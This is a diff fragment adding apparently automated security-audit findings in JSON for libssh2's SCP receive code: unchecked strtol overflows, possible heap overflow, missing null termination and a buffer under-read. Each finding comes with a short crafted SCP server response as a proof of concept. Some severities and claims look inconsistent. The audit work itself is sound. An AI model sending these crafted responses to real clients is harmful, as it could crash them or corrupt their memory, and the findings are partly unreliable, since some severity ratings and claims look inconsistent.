+          "description": "The strtol() calls parsing mtime (line 534) and atime (line 558) use NULL for the endptr parameter and do not check errno after the call. A malicious SCP server can supply extremely large numeric values that overflow long (causing strtol to return LONG_MAX/LONG_MIN with errno=ERANGE, which is never checked), or non-numeric strings (causing strtol to return 0). This results in silently incorrect timestamp values being stored in session->scpRecv_mtime and session->scpRecv_atime, which are later used to set file timestamps. While primarily a data integrity issue, unexpected timestamp values could potentially interfere with security mechanisms that rely on file modification times (e.g., incremental backups, build systems, cache validation).",
+          "poc": "A malicious SCP server sends: \"T99999999999999999999 0 99999999999999999999 0\\n\". The strtol() calls overflow, returning LONG_MAX, but errno is never checked. The resulting timestamps are silently incorrect."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/scp.c [scp_recv D: data recv+ack L574-665]",
+      "chars": 3980,
+      "elapsed_s": 177.8,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "critical",
+          "title": "Integer overflow via unvalidated SCP file size field enabling heap buffer overflow",
+          "line_start": 604,
+          "confidence": 0.85,
+          "description": "The code reads the SCP 'C' response line byte-by-byte into a fixed buffer, validating only basic format (starts with 'C', no control characters, ends with '\\n', minimum 7 bytes). It does NOT validate the file size field within the response. A malicious SCP server can send a crafted response like 'C0644 99999999999999999999 filename\\n' where the size field overflows when parsed as a size_t/unsigned long downstream. The overflowed (wrapped-around) small value is then used to allocate a buffer, but the actual file data written to that buffer far exceeds its size, resulting in a heap buffer overflow. This is the root cause of CVE-2019-3863 and related libssh2 SCP vulnerabilities.",
+          "poc": "A malicious SSH/SCP server sends: 'C0644 18446744073709551616 payload\\n' (size = 2^64 on 64-bit, overflows to 0). The response passes all checks in this code (starts with 'C', no control chars, ends with '\\n', >= 7 bytes). Downstream parsing stores the overflowed size (0), allocates a tiny/zero buffer, then channel data is written past the buffer boundary."
+        },
+        {
+          "severity": "medium",
+          "title": "Missing null termination of SCP response buffer when filled to capacity",
+          "line_start": 604,
+          "confidence": 0.7,
+          "description": "The response reading loop fills session->scpRecv_response up to LIBSSH2_SCP_RESPONSE_BUFLEN bytes. If a malicious server sends a response that is exactly LIBSSH2_SCP_RESPONSE_BUFLEN bytes long (including the terminating '\\n'), the buffer is completely filled with no room for a null terminator. When subsequent parsing code treats the buffer contents as a C string (e.g., using strtol, strtok, sscanf on the size/filename fields), it may read past the end of the buffer, causing an out-of-bounds read or crash.",
+          "poc": "A malicious SCP server sends a 'C' response line that is exactly LIBSSH2_SCP_RESPONSE_BUFLEN bytes long, ending with '\\n'. For example, if LIBSSH2_SCP_RESPONSE_BUFLEN is 256, send: 'C0644 1234 <242-byte filename>\\n'. The buffer is filled to capacity with no null terminator. Any subsequent string operation on this buffer reads past its boundary."
+        },
+        {
+          "severity": "low",
+          "title": "Missing validation of timestamp microsecond fields (acknowledged in comment)",
+          "line_start": 584,
+          "confidence": 0.9,
+          "description": "The code explicitly acknowledges in a comment: 'We *should* check that atime.usec is valid, but why let that stop use?' The mtime and atime microsecond fields parsed from the SCP 'T' command are not validated. Invalid usec values (e.g., >= 1000000 or negative when interpreted as signed) could cause undefined behavior when passed to system calls like utimes() or used in arithmetic, potentially leading to incorrect file timestamps or, on some platforms, unexpected behavior.",
+          "poc": "A malicious SCP server sends: 'T0 9999999 0 9999999\\n' (usec values of 9999999, which is > 999999). The values are stored without validation and later used in utimes() or similar calls, causing undefined behavior depending on the platform."
+        }
+      ]
+    },
+    {
+      "file": "libssh2/scp.c [scp_recv E: close+error handling L665-766]",
+      "chars": 4158,
+      "elapsed_s": 77.2,
+      "status": "ok",
+      "findings": [
+        {
+          "severity": "high",
+          "title": "Buffer Under-Read in SCP Response Newline Stripping Loop",
+          "line_start": 670,
+          "confidence": 0.92,
+          "description": "The while loop that strips trailing \\r and \\n characters from the SCP response decrements scpRecv_response_len without checking for underflow. If the entire response consists solely of \\r and/or \\n characters (e.g., '\\n\\n\\n\\n\\n\\n'), the loop will decrement scpRecv_response_len past 0. When scpRecv_response_len reaches 0, the next iteration accesses session->scpRecv_response[-1], which is an out-of-bounds read. If scpRecv_response_len is an unsigned type (e.g., size_t), it wraps to SIZE_MAX, causing a massive out-of-bounds read and likely a crash. If signed, it goes negative, reading memory before the buffer. The comment claims 'We're guaranteed not to go under response_len == 0 by the logic above,' but no such guarantee is enforced — a response of all newlines passes the earlier minimum-length check and then causes the underflow. Impact: denial of service (crash) at minimum; potential information disclosure if memory before the buffer contains sensitive data and the read doesn't immediately segfault.",
+          "poc": "A malicious SCP server sends a response consisting entirely of newline characters, e.g., '\\n\\n\\n\\n\\n\\n' (6+ bytes to pass the minimum length check). The stripping loop decrements scpRecv_response_len from 6 down to 0, then attempts to read scpRecv_response[-1], triggering the out-of-bounds access."
+        },
+        {
+          "severity": "info",
+          "title": "Missing ERANGE Check in scpsize_strtol Allows Integer Overflow of File Size",
+          "line_start": 715,
+          "confidence": 0.78,
+          "description": "The call to scpsize_strtol(p, &e, 10) parses the file size from the SCP response but only checks whether the entire string was consumed (e && *e). It does not check errno for ERANGE, which strtol sets when the parsed value overflows the return type. A malicious SCP server can provide an extremely large size string (e.g., '99999999999999999999') that overflows, causing scpRecv_size to hold a wrapped/truncated value. Downstream code that uses scpRecv_size for memory allocation or loop bounds could then allocate a buffer that is too small, leading to a heap buffer overflow when the actual file data is written. The same issue applies to the strtol call for mode parsing (line ~695), though mode overflow is less exploitable.",
+          "poc": "A malicious SCP server sends an SCP header like 'C0644 99999999999999999999 filename' where the size field overflows scpsize_strtol's return type. The parsed size wraps to a small value (e.g., 0 or a negative number cast to unsigned), causing a small buffer allocation. The server then sends file data exceeding the allocated buffer, resulting in a heap overflow."
+        },
+        {
+          "severity": "low",
+          "title": "Missing ERANGE Check in strtol for Mode Parsing",
+          "line_start": 695,
+          "confidence": 0.7,
+          "description": "The call to strtol(s, &e, 8) for parsing the file mode does not check errno for ERANGE after the conversion. A malicious SCP server can supply an oversized octal mode value that overflows long, resulting in an incorrect mode being stored in scpRecv_mode. While this is less directly exploitable than the size overflow, it could lead to unexpected file permissions being set (e.g., setuid/setgid bits) if the mode is later applied to a locally created file.",
+          "poc": "A malicious SCP server sends 'C777777777777777777777 1234 filename' where the octal mode overflows strtol, potentially resulting in a mode with setuid/setgid bits set."
+        }
+      ]
+    }
+  ]
+}
